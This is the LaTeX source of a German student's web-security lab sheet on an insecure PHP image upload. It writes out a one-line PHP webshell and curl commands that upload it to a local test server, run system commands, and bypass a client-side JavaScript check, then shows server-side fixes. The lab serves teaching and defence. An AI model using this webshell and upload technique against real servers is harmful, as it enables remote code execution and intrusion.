\documentclass[
	fontsize=12pt,
	paper=a4,
	numbers=noenddot,
	listof=totoc,
	listof=entryprefix,
	listof=nochaptergap,
	bibliography=totoc,
	parskip=half,
	openany
]{scrbook}

\usepackage{cmap}


\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{ngerman}


\usepackage{scrhack}
\usepackage[table]{xcolor}
\usepackage{chngcntr}
\usepackage{enumitem}


\usepackage{amsthm}


\usepackage{lipsum}
\usepackage{unicode-math}


\usepackage{mathtools}


\usepackage[
	colorlinks=false,
	linkcolor=black,
	citecolor=black,
	filecolor=black,
	urlcolor=black,
	bookmarks=true,
	bookmarksopen=true,
	bookmarksopenlevel=3,
	bookmarksnumbered,
	plainpages=false,
	pdfpagelabels=true,
	hyperfootnotes
]{hyperref}


\renewcommand{\familydefault}{\sfdefault}
\usepackage[onehalfspacing]{setspace}
\raggedbottom

\usepackage{anyfontsize}

\addtokomafont{chapter}{\sffamily\large\bfseries}
\addtokomafont{section}{\sffamily\normalsize\bfseries}
\addtokomafont{subsection}{\sffamily\normalsize\mdseries}
\addtokomafont{caption}{\sffamily\normalsize\mdseries}

\usepackage{relsize}
\renewcommand*{\UrlFont}{\ttfamily\smaller\relax}


\usepackage[
	bindingoffset=0cm,
	inner=2.5cm,
	outer=2.5cm,
	top=3cm,
	bottom=2cm
]{geometry}

\usepackage[
	headsepline,
	plainheadsepline
]{scrlayer-scrpage}
\clearpairofpagestyles
\addtokomafont{pagehead}{\normalfont}
\ohead*{\thepage}
\ihead*{\leftmark}


\usepackage{graphicx}
\graphicspath{{pictures/}}
\usepackage{float}

\renewcommand{\thefigure}{\arabic{figure}}
\counterwithout{figure}{chapter}

\usepackage{wrapfig}


\usepackage{booktabs}
\usepackage{multirow}
\usepackage{tabularx}

\renewcommand{\thetable}{\arabic{table}}
\counterwithout{table}{chapter}


\usepackage{listings}
\usepackage{beramono}

\renewcommand{\lstlistlistingname}{List of Code Listings}
\renewcommand{\lstlistingname}{Code Listing}
\newcommand{\listoflolentryname}{\lstlistingname}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.5,0,0.33}
\definecolor{codepurblue}{rgb}{0.16,0.0,1.0}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{codestyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	keywordstyle=\bfseries\color{codepurple},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurblue},
	basicstyle=\scriptsize\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	numbersep=5pt,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	escapeinside={(*@}{@*)}
}
\lstset{style=codestyle, numberbychapter=false}



\KOMAoptions{toc=chapterentrydotfill}
\addtokomafont{chapterentry}{\normalfont}
\setuptoc{toc}{totoc}

\DeclareTOCStyleEntry[beforeskip=0cm]{chapter}{chapter}
\DeclareTOCStyleEntry[beforeskip=0cm]{section}{section}
\DeclareTOCStyleEntry[beforeskip=0cm]{default}{subsection}

\BeforeStartingTOC[lof]{\def\autodot{:}}
\BeforeStartingTOC[lot]{\def\autodot{:}}
\BeforeStartingTOC[lol]{\def\autodot{:}}


\iffalse
\usepackage{csquotes}
\setlength\bibitemsep{.5\baselineskip}
\setcounter{biburlnumpenalty}{9000}
\setcounter{biburllcpenalty}{9000}
\setcounter{biburlucpenalty}{9000}

\fi

\usepackage[printonlyused]{acronym}


\usepackage[title,titletoc]{appendix}

\newcommand{\appendixchapter}[1]{
\cleardoublepage
\pagenumbering{arabic}
\renewcommand{\thepage}{\thechapter-\arabic{page}}
\chapter{#1}
}

\newcommand{\monthlyreport}[2]{
\section{#1}
\centering
\includegraphics[trim=55 35 55 35,clip,width=1\textwidth]{#2}
\clearpage
}



\newtheorem{beispiel}{Beispiel}

\newtheorem{these}{These}

\newtheorem{definition}{Definition}


\usepackage[nameinlink, noabbrev]{cleveref}


\lstset{
	extendedchars=true,
	inputencoding=utf8,
	literate=
		{ä}{{\"a}}1
		{ö}{{\"o}}1
		{ü}{{\"u}}1
		{ß}{{\ss}}1
		{Ä}{{\"A}}1
		{Ö}{{\"O}}1
		{Ü}{{\"U}}1
}

\begin{document}

\begin{titlepage}
	\pagestyle{empty}

	\begin{flushright}
		\begin{figure}[ht]
			\flushright
			\includegraphics[height=2cm]{../../for_latex/hfu}
		\end{figure}
	\end{flushright}

	\begin{center}
		\vspace{3cm}

		{\fontsize{22}{22} \selectfont \textbf{Blatt 4}}\\[5mm]
		{\fontsize{18}{18} \selectfont Web-Security und Intrusion Prevention}

		\vspace{12cm}

		{\fontsize{14}{14} \selectfont Luis Staudt}
	\end{center}
\end{titlepage}


\chapter*{Aufgabe 1: Die Webanwendung}

Die PHP-Anwendung (Apache, \texttt{php:7.2-apache}) erlaubt das Hochladen von
Bildern. \texttt{upload.php} verschiebt die Datei lediglich nach
\texttt{uploads/} und prüft nur die Dateigrösse; eine Prüfung des Dateityps
findet nicht statt:

\begin{lstlisting}[language=PHP]
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
...
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
\end{lstlisting}

Hochgeladene Dateien liegen damit ausführbar im Web-Root unter
\texttt{uploads/}.

\chapter*{Aufgabe 2: Schadcode hochladen}

Als Schadcode dient eine minimale PHP-Webshell, stellvertretend für
p0wny-shell oder phpbash:

\begin{lstlisting}[language=PHP]
<?php echo "<pre>"; system($_GET["cmd"] ?? "id"); echo "</pre>"; ?>
\end{lstlisting}

Der Upload erfolgt über das Formular oder direkt mit curl an den Endpunkt
\texttt{upload.php}:

\begin{lstlisting}[language=bash]
curl -F "fileToUpload=@shell.php" -F "submit=Upload Image" http://127.0.0.1/upload.php
-> Datei shell.php hochgeladen.
\end{lstlisting}

Der Aufruf der hochgeladenen Datei führt den Code aus (Remote Code Execution):

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1/uploads/shell.php?cmd=id;whoami;uname%20-a"
-> uid=33(www-data) gid=33(www-data) groups=33(www-data)
   www-data
   Linux ... x86_64 GNU/Linux
\end{lstlisting}

Der Code wird als Benutzer \texttt{www-data} auf dem Server ausgeführt.

\chapter*{Aufgabe 3: Unzureichender Schutz (nur clientseitig)}

Die Variante \texttt{index-js-security.php} prüft vor dem Upload per JavaScript,
ob eine Bilddatei vorliegt (MIME-Typ, Dateiendung, \verb|accept="image/*"|):

\begin{lstlisting}[language=Java]
if (!file.type.startsWith("image/")) { ... e.preventDefault(); }
const allowedExtensions = ["jpg","jpeg","png","gif","webp"];
\end{lstlisting}

Diese Prüfung findet ausschliesslich clientseitig im Browser statt.
\texttt{upload.php} auf dem Server bleibt unverändert und prüft nichts. Im
Browser erscheint bei Auswahl einer \texttt{.php}-Datei die Fehlermeldung
\glqq Nur Bilddateien erlaubt!\grqq{}. Dabei handelt es sich um eine reine
Komfortprüfung, nicht um einen Sicherheitsmechanismus.

\chapter*{Aufgabe 4: Clientseitige Prüfung umgehen}

Der Browser-Code lädt per POST (multipart/form-data) an \texttt{upload.php}. Mit
curl wird die Datei direkt gesendet. Ohne Browser läuft kein JavaScript, sodass
die clientseitige Prüfung vollständig entfällt:

\begin{lstlisting}[language=bash]
curl -F "fileToUpload=@shell.php" -F "submit=Upload Image" http://127.0.0.1/upload.php
-> Datei shell.php hochgeladen.
curl "http://127.0.0.1/uploads/shell.php?cmd=id"
-> uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}

Trotz der IT-Security-Version bleibt die Remote Code Execution möglich. Eine
clientseitige Prüfung bietet keinen Schutz, da der Angreifer den Client umgeht.

\chapter*{Aufgabe 5: Serverseitige Absicherung}

Die Absicherung erfolgt auf zwei Ebenen.

\section*{a) Inhalt und Typ serverseitig prüfen (upload.php)}

\begin{lstlisting}[language=PHP]
// Inhalt pruefen: nur echte Bilder liefern getimagesize()
$info = @getimagesize($_FILES["fileToUpload"]["tmp_name"]);
if ($info === false) { echo "Abgelehnt: kein gueltiges Bild."; $uploadOk = 0; }
// Endung gegen Whitelist und passend zum erkannten MIME-Typ
$mime_to_ext = ["image/jpeg"=>["jpg","jpeg"],"image/png"=>["png"],
                "image/gif"=>["gif"],"image/webp"=>["webp"]];
if (!in_array($ext,$allowed) || !in_array($ext,$mime_to_ext[$info["mime"]])) { ... }
// eigener zufaelliger Dateiname statt der vom Angreifer gewaehlten Endung
$safe = bin2hex(random_bytes(8)) . "." . $ext;
\end{lstlisting}

\section*{b) PHP-Ausführung im Upload-Ordner verbieten (Defense in Depth)}

Zusätzlich wird Apache so konfiguriert, dass in \texttt{uploads/} kein PHP mehr
ausgeführt wird. Selbst ein als Bild getarntes Polyglot würde dann nur als Datei
ausgeliefert, nicht interpretiert:

\begin{lstlisting}[language=bash]
<Directory /var/www/html/uploads>
    php_admin_flag engine off
    <FilesMatch "\.(php|phtml|phar|php[0-9])$">
        SetHandler none
        Require all denied
    </FilesMatch>
</Directory>
\end{lstlisting}

\section*{Test mit curl}

\begin{lstlisting}[language=bash]
# reine PHP-Shell
curl -F "fileToUpload=@shell.php" ...   -> Abgelehnt: kein gueltiges Bild.
# Polyglot (echtes PNG + PHP) als evil.php
curl -F "fileToUpload=@polyglot.php" ...-> Abgelehnt: Endung passt nicht zum Bildtyp.
# Polyglot als evil.png -> gespeichert, aber nicht ausfuehrbar
curl "http://127.0.0.1/uploads/<rnd>.png" -> liefert rohe Bytes, <?php ?> wird nicht ausgefuehrt
# echtes Bild
curl -F "fileToUpload=@sunglasses.png" ...-> Datei <rnd>.png hochgeladen.
\end{lstlisting}

Der Upload des Schadcodes wird damit verhindert, während echte Bilder weiterhin
funktionieren.


\end{document}
